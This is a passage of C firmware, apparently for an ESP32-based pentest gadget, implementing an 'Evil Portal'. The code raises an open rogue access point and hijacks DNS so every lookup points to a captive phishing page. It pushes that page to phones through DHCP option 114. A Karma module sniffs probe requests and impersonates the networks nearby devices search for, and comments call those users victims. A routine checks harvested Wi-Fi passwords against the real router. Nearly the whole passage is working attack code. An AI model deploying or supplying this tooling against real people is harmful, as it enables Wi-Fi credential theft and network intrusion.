                     (unsigned)((sta_ip_be >> 16) & 0xff),
                     (unsigned)((sta_ip_be >> 24) & 0xff));
            // Fall through to hijack as a safety net.
        }

        // HIJACK MODE: return AP IP for every A query so the client connects
        // back to our HTTP server for the captive portal.
        // Like Arduino's DNSServer: only flip QR bit and set ANCount,
        // keep OPCode/RD and other flags from the original request.
        buf[2] |= 0x80;            // QR = response
        buf[6] = 0; buf[7] = is_a ? 1 : 0; // ANCount
        buf[8] = 0; buf[9] = 0;            // NSCount
        buf[10] = 0; buf[11] = 0;          // ARCount

        int total;
        if(is_a) {
            if(qend + 16 > (int)sizeof(buf)) continue;
            buf[qend + 0]  = 0xC0;
            buf[qend + 1]  = 0x0C;        // pointer to QName
            buf[qend + 2]  = 0x00;
            buf[qend + 3]  = 0x01;        // Type A
            buf[qend + 4]  = 0x00;
            buf[qend + 5]  = 0x01;        // Class IN
            buf[qend + 6]  = 0x00;
            buf[qend + 7]  = 0x00;
            buf[qend + 8]  = 0x00;
            buf[qend + 9]  = 0x01;        // TTL 1s - so when bridge becomes active and
                                          // we switch to forward mode, any stale hijack
                                          // answers (172.0.0.1) the client cached during
                                          // captive portal expire almost immediately and
                                          // re-resolve to the real IP via forward.
            buf[qend + 10] = 0x00;
            buf[qend + 11] = 0x04;        // RDLENGTH = 4
            memcpy(&buf[qend + 12], &ap_ip, 4);
            total = qend + 16;
        } else {
            // For non-A queries: empty answer, just header + question
            total = qend;
        }

        ESP_LOGI(TAG, "DNS q='%s' type=%u -> %s",
                 domain, qtype, is_a ? "A" : "empty");

        sendto(s_dns_socket, buf, total, 0, (struct sockaddr*)&src, slen);
    }

    close(s_dns_socket);
    s_dns_socket = -1;
    s_dns_task = NULL;
    vTaskDeleteWithCaps(NULL);
}

// ---------------------------------------------------------------------------
// Karma: Probe-Requests sniffen waehrend die SoftAP laeuft, die meistgesuchten
// SSIDs ernten und die AP-SSID dynamisch darauf umstellen, damit Geraete ihr
// "bekanntes" (offenes) Netz sehen und automatisch auf das Captive-Portal
// joinen. Reconfig nur wenn kein Client verbunden ist (Opfer nicht kicken).
// ---------------------------------------------------------------------------

#define KARMA_MAX_SSIDS 24
#define KARMA_ROTATE_MS 6000   // Rotations-Intervall
#define KARMA_STALE_MS 180000  // SSIDs aelter als 3 min ignorieren

typedef struct {
    char ssid[33];
    uint16_t hits;
    uint32_t last_ms;
} KarmaEntry;

static portMUX_TYPE s_karma_mux = portMUX_INITIALIZER_UNLOCKED;
static KarmaEntry s_karma_tbl[KARMA_MAX_SSIDS];
static volatile uint16_t s_karma_count = 0;
static volatile bool s_karma_enabled = false;
static volatile bool s_karma_run = false;
static TaskHandle_t s_karma_task = NULL;
static char s_karma_base_ssid[33] = {0}; // Original-SSID, nicht ueberschreiben
static char s_karma_current[33] = {0};   // aktuell gespoofte SSID

// Promiscuous-RX-Callback (WiFi-Task-Kontext): Probe-Requests parsen und die
// gesuchte SSID in die Harvest-Tabelle aufnehmen.
static void karma_promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type != WIFI_PKT_MGMT || !s_karma_enabled) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* fr = p->payload;
    int len = p->rx_ctrl.sig_len;
    if(len < 26) return;
    // Frame Control: Type=Mgmt(0) Subtype=ProbeReq(4) -> Byte0 == 0x40.
    if((fr[0] & 0xFC) != 0x40) return;
    // Tagged params ab Offset 24, SSID = Element-ID 0.
    if(fr[24] != 0) return;
    uint8_t slen = fr[25];
    if(slen == 0 || slen > 32) return; // Wildcard/Broadcast oder ungueltig
    if(26 + slen > len) return;

    char ssid[33];
    memcpy(ssid, &fr[26], slen);
    ssid[slen] = 0;
    if(s_karma_base_ssid[0] && strcmp(ssid, s_karma_base_ssid) == 0) return;

    uint32_t now = esp_log_timestamp();
    portENTER_CRITICAL(&s_karma_mux);
    int found = -1, weakest = 0;
    for(int i = 0; i < (int)s_karma_count; i++) {
        if(strcmp(s_karma_tbl[i].ssid, ssid) == 0) {
            found = i;
            break;
        }
        if(s_karma_tbl[i].hits < s_karma_tbl[weakest].hits) weakest = i;
    }
    if(found >= 0) {
        if(s_karma_tbl[found].hits < 0xFFFF) s_karma_tbl[found].hits++;
        s_karma_tbl[found].last_ms = now;
    } else if(s_karma_count < KARMA_MAX_SSIDS) {
        KarmaEntry* e = &s_karma_tbl[s_karma_count++];
        strncpy(e->ssid, ssid, sizeof(e->ssid) - 1);
        e->ssid[sizeof(e->ssid) - 1] = 0;
        e->hits = 1;
        e->last_ms = now;
    } else {
        // Tabelle voll: schwaechsten Eintrag verdraengen.
        KarmaEntry* e = &s_karma_tbl[weakest];
        strncpy(e->ssid, ssid, sizeof(e->ssid) - 1);
        e->ssid[sizeof(e->ssid) - 1] = 0;
        e->hits = 1;
        e->last_ms = now;
    }
    portEXIT_CRITICAL(&s_karma_mux);
}

// Setzt die SoftAP-SSID neu (offen, gleicher Kanal). Laeuft im Karma-Task.
static void karma_apply_ssid(const char* ssid) {
    wifi_config_t ap_cfg = {0};
    strncpy((char*)ap_cfg.ap.ssid, ssid, 32);
    ap_cfg.ap.ssid_len = strlen(ssid);
    ap_cfg.ap.channel = s_channel ? s_channel : 1;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.beacon_interval = 100;
    esp_err_t err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    if(err == ESP_OK) {
        strncpy(s_karma_current, ssid, sizeof(s_karma_current) - 1);
        s_karma_current[sizeof(s_karma_current) - 1] = 0;
        ESP_LOGI(TAG, "[karma] AP-SSID -> '%s'", ssid);
    } else {
        ESP_LOGW(TAG, "[karma] set_config: %s", esp_err_to_name(err));
    }
}

static void karma_task(void* param) {
    (void)param;
    ESP_LOGI(TAG, "[karma] task start");
    while(s_karma_run) {
        for(int i = 0; i < KARMA_ROTATE_MS / 100 && s_karma_run; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        if(!s_karma_run) break;
        if(s_paused) continue;

        // Kein SSID-Wechsel solange ein Opfer verbunden ist.
        wifi_sta_list_t sl;
        if(esp_wifi_ap_get_sta_list(&sl) == ESP_OK && sl.num > 0) continue;

        uint32_t now = esp_log_timestamp();
        char best[33] = {0};
        uint16_t best_hits = 0;
        portENTER_CRITICAL(&s_karma_mux);
        for(int i = 0; i < (int)s_karma_count; i++) {
            if(now - s_karma_tbl[i].last_ms > KARMA_STALE_MS) continue;
            if(s_karma_tbl[i].hits > best_hits) {
                best_hits = s_karma_tbl[i].hits;
                strncpy(best, s_karma_tbl[i].ssid, sizeof(best) - 1);
                best[sizeof(best) - 1] = 0;
            }
        }
        portEXIT_CRITICAL(&s_karma_mux);

        if(best[0] && strcmp(best, s_karma_current) != 0) {
            karma_apply_ssid(best);
        }
    }
    ESP_LOGI(TAG, "[karma] task stop");
    s_karma_task = NULL;
    vTaskDelete(NULL);
}

static void karma_start(const char* base_ssid) {
    portENTER_CRITICAL(&s_karma_mux);
    s_karma_count = 0;
    portEXIT_CRITICAL(&s_karma_mux);
    strncpy(s_karma_base_ssid, base_ssid ? base_ssid : "", sizeof(s_karma_base_ssid) - 1);
    s_karma_base_ssid[sizeof(s_karma_base_ssid) - 1] = 0;
    strncpy(s_karma_current, base_ssid ? base_ssid : "", sizeof(s_karma_current) - 1);
    s_karma_current[sizeof(s_karma_current) - 1] = 0;

    wifi_promiscuous_filter_t filt = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
    esp_err_t err = esp_wifi_set_promiscuous(true);
    if(err != ESP_OK) {
        ESP_LOGW(TAG, "[karma] set_promiscuous: %s", esp_err_to_name(err));
        return;
    }
    s_karma_enabled = true;
    s_karma_run = true;
    if(xTaskCreate(karma_task, "EpKarma", 3072, NULL, 4, &s_karma_task) != pdPASS) {
        ESP_LOGE(TAG, "[karma] task create FAILED");
        s_karma_run = false;
        s_karma_enabled = false;
        esp_wifi_set_promiscuous(false);
    }
}

static void karma_stop(void) {
    if(!s_karma_enabled && !s_karma_task) return;
    s_karma_run = false;
    s_karma_enabled = false;
    while(s_karma_task) vTaskDelay(pdMS_TO_TICKS(10));
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    portENTER_CRITICAL(&s_karma_mux);
    s_karma_count = 0;
    portEXIT_CRITICAL(&s_karma_mux);
    s_karma_base_ssid[0] = 0;
    s_karma_current[0] = 0;
}

uint16_t wlan_hal_evil_portal_karma_get_ssid_count(void) {
    return s_karma_count;
}

bool wlan_hal_evil_portal_karma_get_current(char* out, size_t out_size) {
    if(!out || out_size == 0) return false;
    if(!s_karma_enabled || !s_karma_current[0]) {
        out[0] = 0;
        return false;
    }
    strncpy(out, s_karma_current, out_size - 1);
    out[out_size - 1] = 0;
    return true;
}

typedef struct {
    const WlanHalEvilPortalConfig* cfg;
    bool result;
} EpStartArgs;

static void evil_portal_start_worker(void* arg) {
    EpStartArgs* sa = arg;
    const WlanHalEvilPortalConfig* cfg = sa->cfg;
    sa->result = false;

    ESP_LOGI(TAG, "[worker] start: ssid='%s' ch=%u html_len=%u",
             cfg->ssid, cfg->channel, (unsigned)cfg->html_len);

    static bool s_netif_done = false;
    if(!s_netif_done) {
        ESP_LOGI(TAG, "[worker] esp_netif_init + event loop");
        esp_netif_init();
        esp_err_t evl = esp_event_loop_create_default();
        if(evl != ESP_OK && evl != ESP_ERR_INVALID_STATE) {
            ESP_LOGW(TAG, "  event_loop_create: %s", esp_err_to_name(evl));
        }
        s_netif_done = true;
    }

    if(!s_ap_netif) {
        ESP_LOGI(TAG, "[worker] creating default AP netif");
        s_ap_netif = esp_netif_create_default_wifi_ap();
        if(!s_ap_netif) {
            ESP_LOGE(TAG, "  AP netif alloc FAILED");
            return;
        }
        // Set AP gateway/netmask to 172.0.0.1/24 (matches Bruce default)
        esp_netif_dhcps_stop(s_ap_netif);
        esp_netif_ip_info_t ip_info = {0};
        IP4_ADDR(&ip_info.ip, 172, 0, 0, 1);
        IP4_ADDR(&ip_info.gw, 172, 0, 0, 1);
        IP4_ADDR(&ip_info.netmask, 255, 255, 255, 0);
        esp_err_t ip_err = esp_netif_set_ip_info(s_ap_netif, &ip_info);
        ESP_LOGI(TAG, "[worker] AP IP set to 172.0.0.1/24: %s", esp_err_to_name(ip_err));
    }

    ESP_LOGI(TAG, "[worker] esp_wifi_init");
    wifi_init_config_t wcfg = WIFI_INIT_CONFIG_DEFAULT();
    // Interner DRAM ist mit BLE-Restore + httpd extrem knapp. Die Default-
    // RX/TX-Buffer (static_rx=10*1600 + dynamic_rx=32) sprengen den Heap
    // ("wifi:malloc buffer fail" -> ESP_ERR_NO_MEM). Gleiches Trimming wie
    // im STA-Pfad (wlan_hal.c) — für einen Captive-AP völlig ausreichend.
    wcfg.static_rx_buf_num = 2;
    wcfg.dynamic_rx_buf_num = 4;
    wcfg.dynamic_tx_buf_num = 8;
    esp_err_t err = esp_wifi_init(&wcfg);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  wifi_init: %s", esp_err_to_name(err));
        return;
    }
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    wifi_config_t ap_cfg = {0};
    strncpy((char*)ap_cfg.ap.ssid, cfg->ssid, 32);
    ap_cfg.ap.ssid_len = strlen(cfg->ssid);
    ap_cfg.ap.channel = cfg->channel ? cfg->channel : 1;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.beacon_interval = 100;

    wifi_mode_t mode = cfg->verify_creds ? WIFI_MODE_APSTA : WIFI_MODE_AP;
    ESP_LOGI(TAG, "[worker] esp_wifi_set_mode(%s)", cfg->verify_creds ? "APSTA" : "AP");
    err = esp_wifi_set_mode(mode);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  set_mode: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    ESP_LOGI(TAG, "[worker] esp_wifi_set_config: ssid='%s' ch=%u", cfg->ssid, ap_cfg.ap.channel);
    err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  set_config: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    if(!s_event_handlers_registered) {
        esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &evil_ap_event_handler, NULL);
        esp_event_handler_register(IP_EVENT, IP_EVENT_AP_STAIPASSIGNED, &evil_ap_event_handler, NULL);
        s_event_handlers_registered = true;
        ESP_LOGI(TAG, "[worker] AP/IP event handlers registered");
    }

    ESP_LOGI(TAG, "[worker] esp_wifi_start");
    err = esp_wifi_start();
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  wifi_start: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    vTaskDelay(pdMS_TO_TICKS(200));

    {
        // Stop DHCPS so we can set captive-portal URI (RFC 8910 / DHCP option 114)
        // which iOS 14+/Android 11+ use to open the CNA window directly.
        esp_netif_dhcps_stop(s_ap_netif);

        static char captive_url[] = "http://172.0.0.1/";
        esp_err_t cp = esp_netif_dhcps_option(
            s_ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI,
            captive_url, sizeof(captive_url) - 1);
        ESP_LOGI(TAG, "[worker] DHCP option 114 set: %s url=%s",
                 esp_err_to_name(cp), captive_url);

        esp_err_t s = esp_netif_dhcps_start(s_ap_netif);
        ESP_LOGI(TAG, "[worker] DHCPS started: %s", esp_err_to_name(s));
    }

    s_channel = ap_cfg.ap.channel;
    s_cred_cb = cfg->cred_cb;
    s_cred_cb_ctx = cfg->cred_cb_ctx;
    s_valid_cb = cfg->valid_cb;
    s_valid_cb_ctx = cfg->valid_cb_ctx;
    s_busy_cb = cfg->busy_cb;
    s_busy_cb_ctx = cfg->busy_cb_ctx;
    s_verify_creds_enabled = cfg->verify_creds;
    s_bridge_redirect = cfg->bridge_redirect;
    s_creds_already_valid = false;
    s_cred_count = 0;

    if(s_router_ssid_options) {
        free(s_router_ssid_options);
        s_router_ssid_options = NULL;
    }
    if(cfg->router_ssid_options && cfg->router_ssid_options[0]) {
        size_t n = strlen(cfg->router_ssid_options);
        s_router_ssid_options = malloc(n + 1);
        if(s_router_ssid_options) {
            memcpy(s_router_ssid_options, cfg->router_ssid_options, n + 1);
        }
    }

    if(s_html_buf) {
        free(s_html_buf);
        s_html_buf = NULL;
        s_html_len = 0;
    }
    if(cfg->html && cfg->html_len > 0) {
        s_html_buf = malloc(cfg->html_len + 1);
        if(s_html_buf) {
            memcpy(s_html_buf, cfg->html, cfg->html_len);
            s_html_buf[cfg->html_len] = 0;
            s_html_len = cfg->html_len;
            ESP_LOGI(TAG, "[worker] HTML buffered: %u bytes", (unsigned)s_html_len);
        } else {
            ESP_LOGE(TAG, "[worker] HTML buffer alloc failed");
        }
    }

    ESP_LOGI(TAG, "[worker] starting HTTP server");
    if(!start_http()) {
        esp_wifi_stop();
        esp_wifi_deinit();
        return;
    }

    ESP_LOGI(TAG, "[worker] starting DNS task");
    s_dns_run = true;
    // Task-Stack ins PSRAM legen (CONFIG_SPIRAM_ALLOW_STACK_EXTERNAL_MEMORY=y):
    // der interne Heap ist nach esp_wifi_init + httpd (13 Sockets) zu knapp fuer
    // 6 KB Stack. Erfordert vTaskDeleteWithCaps() beim Self-Delete (siehe dns_task).
    if(xTaskCreateWithCaps(
           dns_task, "EpDns", DNS_TASK_STACK, NULL, 4, &s_dns_task, MALLOC_CAP_SPIRAM) !=
       pdPASS) {
        ESP_LOGE(TAG, "  DNS task create FAILED");
        s_dns_run = false;
        stop_http();
        esp_wifi_stop();
        esp_wifi_deinit();
        return;
    }

    if(cfg->karma) {
        ESP_LOGI(TAG, "[worker] enabling Karma");
        karma_start(cfg->ssid);
    }

    s_running = true;
    sa->result = true;

    esp_netif_ip_info_t info;
    if(s_ap_netif && esp_netif_get_ip_info(s_ap_netif, &info) == ESP_OK) {
        uint32_t ip = info.ip.addr;
        ESP_LOGI(TAG, "[worker] AP IP=%u.%u.%u.%u",
                 (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff),
                 (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
    }

    ESP_LOGI(TAG, "[worker] Evil Portal ACTIVE: SSID='%s' Ch=%u",
             cfg->ssid, ap_cfg.ap.channel);
}

bool wlan_hal_evil_portal_start(const WlanHalEvilPortalConfig* cfg) {
    if(!cfg || !cfg->ssid || !cfg->ssid[0]) {
        ESP_LOGE(TAG, "start: invalid config");
        return false;
    }
    if(s_running) {
        ESP_LOGW(TAG, "start: already running");
        return false;
    }

    if(wlan_hal_is_started()) {
        ESP_LOGI(TAG, "start: stopping STA mode first");
        wlan_hal_stop();
    }

    Bt* bt = furi_record_open(RECORD_BT);
    s_bt_was_on = bt_is_enabled(bt);
    if(s_bt_was_on) {
        ESP_LOGI(TAG, "start: stopping BLE stack to free RAM");
        bt_stop_stack(bt);
    }
    furi_record_close(RECORD_BT);

    ESP_LOGI(TAG, "start: free internal heap before init: %lu",
             (unsigned long)heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT));

    EpStartArgs sa = {.cfg = cfg, .result = false};
    if(!wlan_hal_run_in_worker(evil_portal_start_worker, &sa)) {
        ESP_LOGE(TAG, "start: worker dispatch failed");
        if(s_bt_was_on) {
            Bt* bt2 = furi_record_open(RECORD_BT);
            bt_start_stack(bt2);
            furi_record_close(RECORD_BT);
            s_bt_was_on = false;
        }
        return false;
    }
    if(!sa.result && s_bt_was_on) {
        ESP_LOGW(TAG, "start: failed in worker, restoring BLE");
        Bt* bt2 = furi_record_open(RECORD_BT);
        bt_start_stack(bt2);
        furi_record_close(RECORD_BT);
        s_bt_was_on = false;
    }
    return sa.result;
}

static void evil_portal_stop_worker(void* arg) {
    (void)arg;
    ESP_LOGI(TAG, "[worker] stopping Evil Portal");

    ESP_LOGI(TAG, "[worker]   stopping DNS task");
    s_dns_run = false;
    while(s_dns_task) vTaskDelay(pdMS_TO_TICKS(10));

    ESP_LOGI(TAG, "[worker]   stopping Karma");
    karma_stop();

    ESP_LOGI(TAG, "[worker]   stopping HTTP server");
    stop_http();

    ESP_LOGI(TAG, "[worker]   esp_wifi_stop + deinit");
    esp_wifi_stop();
    esp_wifi_deinit();

    if(s_html_buf) {
        free(s_html_buf);
        s_html_buf = NULL;
        s_html_len = 0;
    }
    s_cred_cb = NULL;
    s_cred_cb_ctx = NULL;
    s_valid_cb = NULL;
    s_valid_cb_ctx = NULL;
    s_busy_cb = NULL;
    s_busy_cb_ctx = NULL;
    s_verify_creds_enabled = false;
    s_creds_already_valid = false;
    if(s_router_ssid_options) {
        free(s_router_ssid_options);
        s_router_ssid_options = NULL;
    }
    s_running = false;
    s_paused = false;
    ESP_LOGI(TAG, "[worker] Evil Portal STOPPED");
}

void wlan_hal_evil_portal_stop(void) {
    if(!s_running) {
        ESP_LOGI(TAG, "stop: not running");
        return;
    }
    wlan_hal_run_in_worker(evil_portal_stop_worker, NULL);

    if(s_bt_was_on) {
        ESP_LOGI(TAG, "stop: restoring BLE stack");
        Bt* bt = furi_record_open(RECORD_BT);
        bt_start_stack(bt);
        furi_record_close(RECORD_BT);
        s_bt_was_on = false;
    }
}

bool wlan_hal_evil_portal_is_running(void) {
    return s_running;
}

uint32_t wlan_hal_evil_portal_get_cred_count(void) {
    return s_cred_count;
}

void wlan_hal_evil_portal_set_dns_upstream(uint32_t upstream_ip_be) {
    s_dns_upstream_ip_be = upstream_ip_be;
    dns_cache_clear();
    if(upstream_ip_be == 0) {
        ESP_LOGI(TAG, "DNS forward DISABLED (back to hijack)");
    } else {
        ESP_LOGI(TAG, "DNS forward ENABLED, upstream=%u.%u.%u.%u",
                 (unsigned)(upstream_ip_be & 0xff),
                 (unsigned)((upstream_ip_be >> 8) & 0xff),
                 (unsigned)((upstream_ip_be >> 16) & 0xff),
                 (unsigned)((upstream_ip_be >> 24) & 0xff));
    }
}

typedef struct {
    uint16_t count;
} EpClientArgs;

static void evil_portal_get_clients_worker(void* arg) {
    EpClientArgs* a = arg;
    wifi_sta_list_t list;
    if(esp_wifi_ap_get_sta_list(&list) != ESP_OK) {
        a->count = 0;
        return;
    }
    a->count = (uint16_t)list.num;
}

uint16_t wlan_hal_evil_portal_get_client_count(void) {
    if(!s_running) return 0;
    EpClientArgs a = {.count = 0};
    wlan_hal_run_in_worker(evil_portal_get_clients_worker, &a);
    return a.count;
}

typedef struct {
    const char* ssid;
    const char* pwd;
    bool result;
} EpVerifyArgs;

static void evil_portal_verify_worker(void* arg) {
    EpVerifyArgs* a = arg;
    a->result = false;

    // Reset event flags and arm the handler
    s_verify_connected = false;
    s_verify_failed = false;
    s_verify_disconnect_reason = 0;
    s_verify_active = true;

    wifi_config_t sta_cfg = {0};
    strncpy((char*)sta_cfg.sta.ssid, a->ssid, sizeof(sta_cfg.sta.ssid) - 1);
    strncpy((char*)sta_cfg.sta.password, a->pwd, sizeof(sta_cfg.sta.password) - 1);
    sta_cfg.sta.threshold.authmode = WIFI_AUTH_OPEN;

    ESP_LOGI(TAG, "[verify] connecting to '%s'...", a->ssid);

    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(100));
    s_verify_failed = false; // ignore the disconnect we just triggered

    esp_err_t err = esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "[verify]   set_config: %s", esp_err_to_name(err));
        s_verify_active = false;
        return;
    }

    err = esp_wifi_connect();
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "[verify]   connect: %s", esp_err_to_name(err));
        s_verify_active = false;
        return;
    }

    // Wait up to 6s for either STA_CONNECTED or STA_DISCONNECTED. The ESP
    // STA driver auto-reconnects on auth failure, so we keep watching for
    // multiple disconnect events with auth-related reasons before giving up.
    const int total_polls = 60; // 60 x 100 ms = 6 s
    int auth_failures = 0;
    for(int i = 0; i < total_polls; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
        if(s_verify_connected) {
            ESP_LOGI(TAG, "[verify]   STA associated after %d ms", (i + 1) * 100);
            a->result = true;
            break;
        }
        if(s_verify_failed) {
            uint8_t reason = s_verify_disconnect_reason;
            // 200..207 = auth failure family on ESP-IDF
            // 15 = WIFI_REASON_4WAY_HANDSHAKE_TIMEOUT (often = wrong password)
            // 2  = WIFI_REASON_AUTH_EXPIRE
            bool auth_related =
                (reason == 2) || (reason == 15) || (reason >= 200 && reason <= 207);
            if(auth_related) {
                auth_failures++;
                if(auth_failures >= 2) {
                    ESP_LOGI(TAG, "[verify]   auth failed twice (reason=%u), aborting",
                             reason);
                    break;
                }
            }
            s_verify_failed = false;
        }
    }

    s_verify_active = false;

    if(!a->result) {
        ESP_LOGI(TAG, "[verify]   result: INVALID (last reason=%u)",
                 s_verify_disconnect_reason);
    } else {
        ESP_LOGI(TAG, "[verify]   result: VALID");
    }

    esp_wifi_disconnect();
}

bool wlan_hal_evil_portal_verify_creds(const char* ssid, const char* pwd) {
    if(!s_running || !s_verify_creds_enabled || !ssid || !pwd) return false;
    EpVerifyArgs a = {.ssid = ssid, .pwd = pwd, .result = false};
    wlan_hal_run_in_worker(evil_portal_verify_worker, &a);
    return a.result;
}

static void evil_portal_pause_worker(void* arg) {
    (void)arg;
    if(!s_running || s_paused) return;
    ESP_LOGI(TAG, "[worker] pausing AP (esp_wifi_stop)");
    esp_wifi_stop();
    s_paused = true;
}

static void evil_portal_resume_worker(void* arg) {
    (void)arg;
    if(!s_running || !s_paused) return;
    ESP_LOGI(TAG, "[worker] resuming AP (esp_wifi_start)");
    esp_err_t err = esp_wifi_start();
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  wifi_start: %s", esp_err_to_name(err));
        return;
    }
    s_paused = false;
}

void wlan_hal_evil_portal_pause(void) {
    if(!s_running || s_paused) return;
    wlan_hal_run_in_worker(evil_portal_pause_worker, NULL);
}

void wlan_hal_evil_portal_resume(void) {
    if(!s_running || !s_paused) return;
    wlan_hal_run_in_worker(evil_portal_resume_worker, NULL);
}

bool wlan_hal_evil_portal_is_paused(void) {
    return s_paused;
}
